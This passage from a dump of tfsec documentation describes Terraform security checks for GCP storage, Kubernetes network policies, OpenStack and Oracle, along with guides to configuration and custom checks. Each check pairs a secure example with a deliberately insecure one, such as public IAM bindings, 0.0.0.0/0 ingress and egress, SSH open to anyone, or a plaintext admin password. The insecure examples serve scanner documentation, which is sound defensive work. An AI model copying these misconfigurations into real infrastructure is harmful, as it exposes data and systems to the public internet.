[\"GET\", \"HEAD\", \"PUT\", \"POST\", \"DELETE\"]\n \t\tresponse_header = [\"*\"]\n \t\tmax_age_seconds = 3600\n \t}\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/storage_bucket#uniform_bucket_level_access](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/storage_bucket#uniform_bucket_level_access){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://cloud.google.com/storage/docs/uniform-bucket-level-access](https://cloud.google.com/storage/docs/uniform-bucket-level-access){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://jbrojbrojbro.medium.com/you-make-the-rules-with-authentication-controls-for-cloud-storage-53c32543747b](https://jbrojbrojbro.medium.com/you-make-the-rules-with-authentication-controls-for-cloud-storage-53c32543747b){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:23.389724"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/storage/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/storage/index.md", "content": "---\ntitle: storage\n---\n\n# storage\n\n## Checks\n\n\n- [enable-ubla](enable-ubla) Ensure that Cloud Storage buckets have uniform bucket-level access enabled\n\n- [no-public-access](no-public-access) Ensure that Cloud Storage bucket is not anonymously or publicly accessible.\n\n\n\n", "timestamp": "2025-10-24T22:25:23.492174"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/storage/no-public-access/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/storage/no-public-access/index.md", "content": "---\ntitle: Ensure that Cloud Storage bucket is not anonymously or publicly accessible.\n---\n\n# Ensure that Cloud Storage bucket is not anonymously or publicly accessible.\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nUsing 'allUsers' or 'allAuthenticatedUsers' as members in an IAM member/binding causes data to be exposed outside of the organisation.\n\n### Possible Impact\nPublic exposure of sensitive data.\n\n### Suggested Resolution\nRestrict public access to the bucket.\n\n\n### Insecure Example\n\nThe following example will fail the google-storage-no-public-access check.\n```terraform\n\n resource \"google_storage_bucket_iam_binding\" \"binding\" {\n \tbucket = google_storage_bucket.default.name\n \trole = \"roles/storage.admin\"\n \tmembers = [\n \t\t\"allAuthenticatedUsers\",\n \t]\n }\n \t\t\t\n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-storage-no-public-access check.\n```terraform\n\n resource \"google_storage_bucket_iam_binding\" \"binding\" {\n \tbucket = google_storage_bucket.default.name\n \trole = \"roles/storage.admin\"\n \tmembers = [\n \t\t\"user:jane@example.com\",\n \t]\n }\n \t\t\t\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/storage_bucket_iam#member/members](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/storage_bucket_iam#member/members){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://jbrojbrojbro.medium.com/you-make-the-rules-with-authentication-controls-for-cloud-storage-53c32543747b](https://jbrojbrojbro.medium.com/you-make-the-rules-with-authentication-controls-for-cloud-storage-53c32543747b){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:23.768091"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/kubernetes/network/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/kubernetes/network/index.md", "content": "---\ntitle: network\n---\n\n# network\n\n## Checks\n\n\n- [no-public-egress](no-public-egress) Public egress should not be allowed via network policies\n\n- [no-public-ingress](no-public-ingress) Public ingress should not be allowed via network policies\n\n\n\n", "timestamp": "2025-10-24T22:25:24.290354"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/kubernetes/network/no-public-egress/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/kubernetes/network/no-public-egress/index.md", "content": "---\ntitle: Public egress should not be allowed via network policies\n---\n\n# Public egress should not be allowed via network policies\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nYou should not expose infrastructure to the public internet except where explicitly required\n\n### Possible Impact\nExfiltration of data to the public internet\n\n### Suggested Resolution\nRemove public access except where explicitly required\n\n\n### Insecure Example\n\nThe following example will fail the kubernetes-network-no-public-egress check.\n```terraform\n\n resource \"kubernetes_network_policy\" \"bad_example\" {\n   metadata {\n     name      = \"terraform-example-network-policy\"\n     namespace = \"default\"\n   }\n \n   spec {\n     pod_selector {\n       match_expressions {\n         key      = \"name\"\n         operator = \"In\"\n         values   = [\"webfront\", \"api\"]\n       }\n     }\n \n     egress {\n       ports {\n         port     = \"http\"\n         protocol = \"TCP\"\n       }\n       ports {\n         port     = \"8125\"\n         protocol = \"UDP\"\n       }\n \n       to {\n         ip_block {\n           cidr = \"0.0.0.0/0\"\n           except = [\n             \"10.0.0.0/24\",\n             \"10.0.1.0/24\",\n           ]\n         }\n       }\n     }\n \n     ingress {\n       ports {\n         port     = \"http\"\n         protocol = \"TCP\"\n       }\n       ports {\n         port     = \"8125\"\n         protocol = \"UDP\"\n       }\n \n       from {\n         ip_block {\n           cidr = \"10.0.0.0/16\"\n           except = [\n             \"10.0.0.0/24\",\n             \"10.0.1.0/24\",\n           ]\n         }\n       }\n     }\n \n     policy_types = [\"Ingress\", \"Egress\"]\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the kubernetes-network-no-public-egress check.\n```terraform\n\n resource \"kubernetes_network_policy\" \"good_example\" {\n   metadata {\n     name      = \"terraform-example-network-policy\"\n     namespace = \"default\"\n   }\n \n   spec {\n     pod_selector {\n       match_expressions {\n         key      = \"name\"\n         operator = \"In\"\n         values   = [\"webfront\", \"api\"]\n       }\n     }\n \n     egress {\n       ports {\n         port     = \"http\"\n         protocol = \"TCP\"\n       }\n       ports {\n         port     = \"8125\"\n         protocol = \"UDP\"\n       }\n \n       to {\n         ip_block {\n           cidr = \"10.0.0.0/16\"\n           except = [\n             \"10.0.0.0/24\",\n             \"10.0.1.0/24\",\n           ]\n         }\n       }\n     }\n \n     ingress {\n       ports {\n         port     = \"http\"\n         protocol = \"TCP\"\n       }\n       ports {\n         port     = \"8125\"\n         protocol = \"UDP\"\n       }\n \n       from {\n         ip_block {\n           cidr = \"10.0.0.0/16\"\n           except = [\n             \"10.0.0.0/24\",\n             \"10.0.1.0/24\",\n           ]\n         }\n       }\n     }\n \n     policy_types = [\"Ingress\", \"Egress\"]\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/kubernetes/latest/docs/resources/network_policy#spec.ingress.from.ip_block.cidr](https://registry.terraform.io/providers/hashicorp/kubernetes/latest/docs/resources/network_policy#spec.ingress.from.ip_block.cidr){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:24.573309"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/kubernetes/network/no-public-ingress/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/kubernetes/network/no-public-ingress/index.md", "content": "---\ntitle: Public ingress should not be allowed via network policies\n---\n\n# Public ingress should not be allowed via network policies\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nYou should not expose infrastructure to the public internet except where explicitly required\n\n### Possible Impact\nExposure of infrastructure to the public internet\n\n### Suggested Resolution\nRemove public access except where explicitly required\n\n\n### Insecure Example\n\nThe following example will fail the kubernetes-network-no-public-ingress check.\n```terraform\n\n resource \"kubernetes_network_policy\" \"bad_example\" {\n   metadata {\n     name      = \"terraform-example-network-policy\"\n     namespace = \"default\"\n   }\n \n   spec {\n     pod_selector {\n       match_expressions {\n         key      = \"name\"\n         operator = \"In\"\n         values   = [\"webfront\", \"api\"]\n       }\n     }\n \n     ingress {\n       ports {\n         port     = \"http\"\n         protocol = \"TCP\"\n       }\n       ports {\n         port     = \"8125\"\n         protocol = \"UDP\"\n       }\n \n       from {\n         ip_block {\n           cidr = \"0.0.0.0/0\"\n           except = [\n             \"10.0.0.0/24\",\n             \"10.0.1.0/24\",\n           ]\n         }\n       }\n     }\n \n     egress {\n       ports {\n         port     = \"http\"\n         protocol = \"TCP\"\n       }\n       ports {\n         port     = \"8125\"\n         protocol = \"UDP\"\n       }\n \n       to {\n         ip_block {\n           cidr = \"0.0.0.0/0\"\n           except = [\n             \"10.0.0.0/24\",\n             \"10.0.1.0/24\",\n           ]\n         }\n       }\n     }\n \n     policy_types = [\"Ingress\", \"Egress\"]\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the kubernetes-network-no-public-ingress check.\n```terraform\n\n resource \"kubernetes_network_policy\" \"good_example\" {\n   metadata {\n     name      = \"terraform-example-network-policy\"\n     namespace = \"default\"\n   }\n \n   spec {\n     pod_selector {\n       match_expressions {\n         key      = \"name\"\n         operator = \"In\"\n         values   = [\"webfront\", \"api\"]\n       }\n     }\n \n     ingress {\n       ports {\n         port     = \"http\"\n         protocol = \"TCP\"\n       }\n       ports {\n         port     = \"8125\"\n         protocol = \"UDP\"\n       }\n \n       from {\n         ip_block {\n           cidr = \"10.0.0.0/16\"\n           except = [\n             \"10.0.0.0/24\",\n             \"10.0.1.0/24\",\n           ]\n         }\n       }\n     }\n \n     egress {\n       ports {\n         port     = \"http\"\n         protocol = \"TCP\"\n       }\n       ports {\n         port     = \"8125\"\n         protocol = \"UDP\"\n       }\n \n       to {\n         ip_block {\n           cidr = \"0.0.0.0/0\"\n           except = [\n             \"10.0.0.0/24\",\n             \"10.0.1.0/24\",\n           ]\n         }\n       }\n     }\n \n     policy_types = [\"Ingress\", \"Egress\"]\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/kubernetes/latest/docs/resources/network_policy#spec.ingress.from.ip_block.cidr](https://registry.terraform.io/providers/hashicorp/kubernetes/latest/docs/resources/network_policy#spec.ingress.from.ip_block.cidr){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:24.850955"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/openstack/compute/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/openstack/compute/index.md", "content": "---\ntitle: compute\n---\n\n# compute\n\n## Checks\n\n\n- [no-plaintext-password](no-plaintext-password) No plaintext password for compute instance\n\n- [no-public-access](no-public-access) A firewall rule allows traffic from/to the public internet\n\n\n\n", "timestamp": "2025-10-24T22:25:25.279142"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/openstack/compute/no-plaintext-password/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/openstack/compute/no-plaintext-password/index.md", "content": "---\ntitle: No plaintext password for compute instance\n---\n\n# No plaintext password for compute instance\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nAssigning a password to the compute instance using plaintext could lead to compromise; it would be preferable to use key-pairs as a login mechanism\n\n### Possible Impact\nIncluding a plaintext password could lead to compromised instance\n\n### Suggested Resolution\nDo not use plaintext passwords in terraform files\n\n\n### Insecure Example\n\nThe following example will fail the openstack-compute-no-plaintext-password check.\n```terraform\n\n resource \"openstack_compute_instance_v2\" \"bad_example\" {\n   name            = \"basic\"\n   image_id        = \"ad091b52-742f-469e-8f3c-fd81cadf0743\"\n   flavor_id       = \"3\"\n   admin_pass      = \"N0tSoS3cretP4ssw0rd\"\n   security_groups = [\"default\"]\n   user_data       = \"#cloud-config\\nhostname: instance_1.example.com\\nfqdn: instance_1.example.com\"\n \n   network {\n     name = \"my_network\"\n   }\n }\n```\n\n\n\n### Secure Example\n\nThe following example will pass the openstack-compute-no-plaintext-password check.\n```terraform\n\n resource \"openstack_compute_instance_v2\" \"good_example\" {\n   name            = \"basic\"\n   image_id        = \"ad091b52-742f-469e-8f3c-fd81cadf0743\"\n   flavor_id       = \"3\"\n   key_pair        = \"my_key_pair_name\"\n   security_groups = [\"default\"]\n   user_data       = \"#cloud-config\\nhostname: instance_1.example.com\\nfqdn: instance_1.example.com\"\n \n   network {\n     name = \"my_network\"\n   }\n }\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/terraform-provider-openstack/openstack/latest/docs/resources/compute_instance_v2#admin_pass](https://registry.terraform.io/providers/terraform-provider-openstack/openstack/latest/docs/resources/compute_instance_v2#admin_pass){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:25.571324"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/openstack/compute/no-public-access/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/openstack/compute/no-public-access/index.md", "content": "---\ntitle: A firewall rule allows traffic from/to the public internet\n---\n\n# A firewall rule allows traffic from/to the public internet\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nOpening up ports to the public internet is generally to be avoided. You should restrict access to IP addresses or ranges that explicitly require it where possible.\n\n### Possible Impact\nExposure of infrastructure to the public internet\n\n### Suggested Resolution\nEmploy more restrictive firewall rules\n\n\n### Insecure Example\n\nThe following example will fail the openstack-compute-no-public-access check.\n```terraform\n\n resource \"openstack_fw_rule_v1\" \"rule_1\" {\n \tname             = \"my_rule\"\n \tdescription      = \"let anyone in\"\n \taction           = \"allow\"\n \tprotocol         = \"tcp\"\n \tdestination_port = \"22\"\n \tenabled          = \"true\"\n }\n \t\t\t\n```\n\n\n\n### Secure Example\n\nThe following example will pass the openstack-compute-no-public-access check.\n```terraform\n\n resource \"openstack_fw_rule_v1\" \"rule_1\" {\n \tname                   = \"my_rule\"\n \tdescription            = \"don't let just anyone in\"\n \taction                 = \"allow\"\n \tprotocol               = \"tcp\"\n \tdestination_ip_address = \"10.10.10.1\"\n \tsource_ip_address      = \"10.10.10.2\"\n \tdestination_port       = \"22\"\n \tenabled                = \"true\"\n }\n \t\t\t\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/terraform-provider-openstack/openstack/latest/docs/resources/fw_rule_v1](https://registry.terraform.io/providers/terraform-provider-openstack/openstack/latest/docs/resources/fw_rule_v1){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:25.864149"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/openstack/networking/describe-security-group/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/openstack/networking/describe-security-group/index.md", "content": "---\ntitle: Missing description for security group.\n---\n\n# Missing description for security group.\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nSecurity groups should include a description for auditing purposes. Simplifies auditing, debugging, and managing security groups.\n\n### Possible Impact\nAuditing capability and awareness limited.\n\n### Suggested Resolution\nAdd descriptions for all security groups\n\n\n### Insecure Example\n\nThe following example will fail the openstack-networking-describe-security-group check.\n```terraform\n\n resource \"openstack_networking_secgroup_v2\" \"group_1\" {\n }\n \t\t\t\n```\n\n\n\n### Secure Example\n\nThe following example will pass the openstack-networking-describe-security-group check.\n```terraform\n\n resource \"openstack_networking_secgroup_v2\" \"group_1\" {\n \tdescription            = \"don't let just anyone in\"\n }\n \t\t\t\n```\n\n\n\n\n", "timestamp": "2025-10-24T22:25:26.466817"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/openstack/networking/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/openstack/networking/index.md", "content": "---\ntitle: networking\n---\n\n# networking\n\n## Checks\n\n\n- [describe-security-group](describe-security-group) Missing description for security group.\n\n- [no-public-egress](no-public-egress) A security group rule allows egress traffic to multiple public addresses\n\n- [no-public-ingress](no-public-ingress) A security group rule allows ingress traffic from multiple public addresses\n\n\n\n", "timestamp": "2025-10-24T22:25:26.591001"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/openstack/networking/no-public-egress/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/openstack/networking/no-public-egress/index.md", "content": "---\ntitle: A security group rule allows egress traffic to multiple public addresses\n---\n\n# A security group rule allows egress traffic to multiple public addresses\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nOpening up ports to the public internet is generally to be avoided. You should restrict access to IP addresses or ranges that explicitly require it where possible.\n\n### Possible Impact\nPotential exfiltration of data to the public internet\n\n### Suggested Resolution\nEmploy more restrictive security group rules\n\n\n### Insecure Example\n\nThe following example will fail the openstack-networking-no-public-egress check.\n```terraform\n\n resource \"openstack_networking_secgroup_rule_v2\" \"rule_1\" {\n\tdirection         = \"egress\"\n\tethertype         = \"IPv4\"\n\tprotocol          = \"tcp\"\n\tport_range_min    = 22\n\tport_range_max    = 22\n\tremote_ip_prefix  = \"0.0.0.0/0\"\n }\n\n```\n\n\n\n### Secure Example\n\nThe following example will pass the openstack-networking-no-public-egress check.\n```terraform\n\nresource \"openstack_networking_secgroup_rule_v2\" \"rule_1\" {\n\tdirection         = \"egress\"\n\tethertype         = \"IPv4\"\n\tprotocol          = \"tcp\"\n\tport_range_min    = 22\n\tport_range_max    = 22\n\tremote_ip_prefix  = \"1.2.3.4/32\"\n}\n\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/terraform-provider-openstack/openstack/latest/docs/resources/networking_secgroup_rule_v2](https://registry.terraform.io/providers/terraform-provider-openstack/openstack/latest/docs/resources/networking_secgroup_rule_v2){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:26.869247"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/openstack/networking/no-public-ingress/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/openstack/networking/no-public-ingress/index.md", "content": "---\ntitle: A security group rule allows ingress traffic from multiple public addresses\n---\n\n# A security group rule allows ingress traffic from multiple public addresses\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nOpening up ports to the public internet is generally to be avoided. You should restrict access to IP addresses or ranges that explicitly require it where possible.\n\n### Possible Impact\nExposure of infrastructure to the public internet\n\n### Suggested Resolution\nEmploy more restrictive security group rules\n\n\n### Insecure Example\n\nThe following example will fail the openstack-networking-no-public-ingress check.\n```terraform\n\n resource \"openstack_networking_secgroup_rule_v2\" \"rule_1\" {\n\tdirection         = \"ingress\"\n\tethertype         = \"IPv4\"\n\tprotocol          = \"tcp\"\n\tport_range_min    = 22\n\tport_range_max    = 22\n\tremote_ip_prefix  = \"0.0.0.0/0\"\n }\n \t\t\t\n```\n\n\n\n### Secure Example\n\nThe following example will pass the openstack-networking-no-public-ingress check.\n```terraform\n\n resource \"openstack_networking_secgroup_rule_v2\" \"rule_1\" {\n\tdirection         = \"ingress\"\n\tethertype         = \"IPv4\"\n\tprotocol          = \"tcp\"\n\tport_range_min    = 22\n\tport_range_max    = 22\n\tremote_ip_prefix  = \"1.2.3.4/32\"\n }\n \t\t\t\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/terraform-provider-openstack/openstack/latest/docs/resources/fw_rule_v1](https://registry.terraform.io/providers/terraform-provider-openstack/openstack/latest/docs/resources/fw_rule_v1){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:27.141534"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/oracle/compute/no-public-ip/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/oracle/compute/no-public-ip/index.md", "content": "---\ntitle: Compute instance requests an IP reservation from a public pool\n---\n\n# Compute instance requests an IP reservation from a public pool\n\n### Default Severity: <span class=\"severity critical\">critical</span>\n\n### Explanation\n\nCompute instance requests an IP reservation from a public pool\n\nThe compute instance has the ability to be reached from outside, you might want to sonder the use of a non public IP.\n\n### Possible Impact\nThe compute instance has the ability to be reached from outside\n\n### Suggested Resolution\nReconsider the use of an public IP\n\n\n### Insecure Example\n\nThe following example will fail the oracle-compute-no-public-ip check.\n```terraform\n\n resource \"opc_compute_ip_address_reservation\" \"bad_example\" {\n \tname            = \"my-ip-address\"\n \tip_address_pool = \"public-ippool\"\n   }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the oracle-compute-no-public-ip check.\n```terraform\n\n resource \"opc_compute_ip_address_reservation\" \"good_example\" {\n \tname            = \"my-ip-address\"\n \tip_address_pool = \"cloud-ippool\"\n   }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/opc/latest/docs/resources/opc_compute_ip_address_reservation](https://registry.terraform.io/providers/hashicorp/opc/latest/docs/resources/opc_compute_ip_address_reservation){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://registry.terraform.io/providers/hashicorp/opc/latest/docs/resources/opc_compute_instance](https://registry.terraform.io/providers/hashicorp/opc/latest/docs/resources/opc_compute_instance){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:27.915832"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/guides/configuration/config.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/guides/configuration/config.md", "content": "---\ntitle:  Config File\ndescription:  Config File\nsummary: Adding an optional config file\nauthor: tfec\ntags: [configuration]\n---\n\nThe tfsec config file can override various tfsec configurations.\n\nThe tfsec config file is a file in the `.tfsec` folder in the root check path named `config.json` or `config.yml` and is automatically loaded if it exists.\n\nThe config file can also be set with the `--config-file` option:\n\n```\ntfsec --config-file tfsec.yml\n```\n\nConfig files can be downloaded from remote locations using the `--config-file-url`. This must be a HTTP location to a file with either a `json` or `yaml` extension\n\n```\ntfsec --config-file-url https://github.com/myorg/tfsecconfig/config.json .\n```\n\n## Minimum Severity\n\nYou can specify the minimum severity of result that should be reported. By default, every severity is reported. You must use one of CRITICAL, HIGH, MEDIUM, LOW.\n\n```json\n{\n  \"minimum_severity\": \"MEDIUM\"\n}\n```\n\nor in yaml\n\n```yaml\n---\nminimum_severity: MEDIUM\n```\n\n## Syntax and Overrides\n\n### Severity Overrides\n\nThere are occasions where the default severity level for one of the built in checks is too severe or in some cases not strong enough.\n\nThe config file can be used to specify overrides for any check identifier to replace the result output.\n\n```json\n{\n  \"severity_overrides\": {\n    \"CUS002\": \"ERROR\",\n    \"aws-s3-enable-versioning\": \"LOW\"\n  }\n}\n```\n\nor in yaml\n\n```yaml\n---\nseverity_overrides:\n  CUS002: ERROR\n  aws-s3-enable-versioning: HIGH\n```\n\n### Including checks\n\nIn some situations you may want to only scan for a subset of the checks - this may be the case if newly added checks need to be evaluated before adding to the CI.\nWe have removed the option to pass the included checks on the command line but they can be added in the config file.\n\n```json\n{\n  \"include\": [\"CUS002\", \"aws-s3-enable-versioning\"]\n}\n```\n\nor in yaml\n\n```yaml\n---\ninclude:\n  - CUS002\n  - aws-s3-enable-versioning\n```\n\n### Excluding checks\n\nThere are moments where the list of checks you'd want to exclude becomes larger and larger.\nRather than passing all the excluded checks via the command line, you can use the configuration\nentry `exclude` to list them all out.\n\n```json\n{\n  \"exclude\": [\"CUS002\", \"aws-s3-enable-versioning\"]\n}\n```\n\nor in yaml\n\n```yaml\n---\nexclude:\n  - CUS002\n  - aws-s3-enable-versioning\n```\n\nExcludes can include an expiry date, after which the check will be re-enabled.\n\n```json\n{\n  \"exclude\": [\"CUS002:2022-12-31\", \"aws-s3-enable-versioning\"]\n}\n```\n\nor in yaml\n\n\n```yaml\n---\nexclude:\n  - CUS002:2022-12-31\n  - aws-s3-enable-versioning\n```\n\n### Minimum required version\n\nFor your CI you might want to pull a config file into all of your build processes with a centrally managed config file. If this is the case, you might also want to require a minimum tfsec version to be used.\n\nThis can be achieved in the config file using the `min_required_version` setting. \n\n\n```json\n{\n  \"min_required_version\": \"v1.1.2\"\n}\n```\n\nor in yaml\n\n```yaml\n---\nmin_required_version: v1.1.2\n```\n", "timestamp": "2025-10-24T22:25:28.633861"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/guides/configuration/custom-checks.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/guides/configuration/custom-checks.md", "content": "---\ntitle: Custom Checks\ndescription: Custom Checks\nsubtitle: Adding custom checks to your tfsec config\ndescription: Adding custom checks to your tfsec config\nauthor: tfsec\ntags: [installation, github action, code scanning, security analysis]\n---\n\n## What is it?\ntfsec comes with an ever growing number of built in checks, these cover standard AWS, Azure and GCP provider checks, plus several more.\n\nWe recognise that there are checks that need performing for an organisation that don't fit with general use cases; for this, there are custom checks.\n\nCustom checks offer an accessible approach to injecting checks that satisfy your organisations compliance and security needs. For example, if you require that all EC2 instances have a `CostCentre` tag, that can be achieved with a `custom_check`.\n\n## How does it work?\nCustom checks are defined as json files which sit in the `.tfsec` folder in the root check path. any file with the suffix `_tfchecks.json` or `_tfchecks.yaml` will be parsed and the checks included during the run.\n\n\n### Overriding check directory\nThe default location for custom checks can be overridden, this is done using the `--custom-check-dir` to specify another location to load the checks from instead.\nThis is useful when global checks are to applied to the terraform under test.\n\n### Downloading remote check file\nA custom check file can be downloaded from remote locations using the `--custom-check-url`. This must be an HTTP location to a file with either a `json` or `yaml` extension\n\n```\ntfsec --custom-check-url https://github.com/myorg/tfsecconfig/custom_tfchecks.json .\n```\n\n### What does a check file look like?\nCheck files are simply json, this ensures that checks can be put together without requiring Go knowledge or being able to build a new release of tfsec to include your custom code.\n\nTaking the previous example of a required cost centre, the check file might look something like\n\n```json\n{\n  \"checks\": [\n    {\n      \"code\": \"CUS001\",\n      \"description\": \"Custom check to ensure the CostCentre tag is applied to EC2 instances\",\n      \"impact\": \"By not having CostCentre we can't keep track of billing\",\n      \"resolution\": \"Add the CostCentre tag\",\n      \"requiredTypes\": [\n        \"resource\"\n      ],\n      \"requiredLabels\": [\n        \"aws_instance\"\n      ],\n      \"severity\": \"ERROR\",\n      \"matchSpec\": {\n        \"name\": \"tags\",\n        \"action\": \"contains\",\n        \"value\": \"CostCentre\"\n      },\n      \"errorMessage\": \"The required CostCentre tag was missing\",\n      \"relatedLinks\": [\n        \"http://internal.acmecorp.com/standards/aws/tagging.html\"\n      ]\n    }\n  ]   \n}\n```\n\nor \n\n```yaml\n---\nchecks:\n- code: CUS001\n  description: Custom check to ensure the CostCentre tag is applied to EC2 instances\n  impact: By not having CostCentre we can't keep track of billing\n  resolution: Add the CostCentre tag\n  requiredTypes:\n  - resource\n  requiredLabels:\n  - aws_instance\n  severity: ERROR\n  matchSpec:\n    name: tags\n    action: contains\n    value: CostCentre\n  errorMessage: The required CostCentre tag was missing\n  relatedLinks:\n  - http://internal.acmecorp.com/standards/aws/tagging.html\n\n```\n\nUsing `go run ./cmd/tfsec-checkgen generate`, you can generate a skeleton custom check file.\n\nThe check contains up of the following attributes;\n\n| Attribute      | Description                                                                                            |\n| :------------- |:-------------------------------------------------------------------------------------------------------|\n| code           | The custom code that your check will be known as                                                       |\n| description    | A description for the code that will be included in the output                                         |\n| impact         | An optional detail about the consequences of not passing the check                                     |\n| resolution     | An optional brief description of how to satisfy the check                                              |\n| requiredTypes  | The block types to apply the check to - provider, resource, data, module, variable                     |\n| requiredLabels | The resource type - aws_ec2_instance for example. This also supports wildcards using `*`, e.g. `aws_*` |\n| severity       | How severe is the check                                                                                |\n| matchSpec      | See below for the MatchSpec attributes                                                                 |\n| errorMessage   | The error message that should be displayed in cases where the check fails                              |\n| relatedLinks   | A list of related links for the check to be displayed in cases where the check fails                   |\n\nOptionally, you can use your own provider name and service\n\n> :warning: care should be taken not to mask existing checks. It is suggested that the provider shouldn't be one of the built in ones or should include the `custom` designator.\n\n| Attribute | Description                                            |\n|:----------|:-------------------------------------------------------|\n| provider  | The name of the service the custom check is addressing      |\n| service   | The name of the service the custom check is addressing |\n\n\nThe `MatchSpec` is the what will define the check itself - this is fairly basic and is made up of the following attributes\n\n| Attribute          | Description                                                                                                                                                           |\n| :----------------- | :-------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| name               | The name of the attribute or block to run the check on                                                                                                                |\n| action             | The check type - see below for more information                                                                                                                       |\n| value              | In cases where a value is required, the value to look for, text matching `TFSEC_VAR_{VAR_NAME}` will be replaced with the variable value                              |\n| ignoreUndefined    | If the attribute is undefined, ignore and pass the check                                                                                                              |\n| preConditions      | An array of checks, performs the check action defined in `action` if all preConditions checks passes, passes the whole `matchSpec` if preConditions are not satisfied |\n| subMatch           | A sub MatchSpec block for nested checking - think looking for `enabled` value in a `logging` block, or checking a tag's value in a `tag` map attribute                |\n| subMatchOne        | Same as subMatch, but looks for only exactly 1 match in nested checks, cannot be applied on subMatches for attributes                                                 |\n| predicateMatchSpec | An array of MatchSpec blocks to be logically aggregated by either `and` or `or` actions                                                                               |\n| assignVariable     | The name of the \"variable\" to store the value of the `name` attribute in, has to be in uppercase and start with `TFSEC_VAR_`                                          |\n\n#### Check Actions\nThere are a number of `CheckActions` available which should allow you to quickly put together most checks.\n\n##### inModule\nThe `inModule` check action passes if the resource block is a component of a module. For example, if you're looking to check that an `aws_s3_bucket` is only created using a custom module, you could use the following `MatchSpec`;\n\n```json\n\"matchSpec\" : {\n  \"action\": \"inModule\"\n}\n```\n\n```yaml\nmatchSpec:\n  action: inModule\n```\n\n##### isPresent\nThe `isPresent` check action passes if the required block or attribute is available in the checked block. For example, if you're looking to check that an `acl` is provided and don't care what it is, you can use the following `MatchSpec`;\n\n```json\n\"matchSpec\" : {\n  \"name\": \"acl\",\n  \"action\": \"isPresent\"\n}\n```\n\n```yaml\nmatchSpec:\n  name: 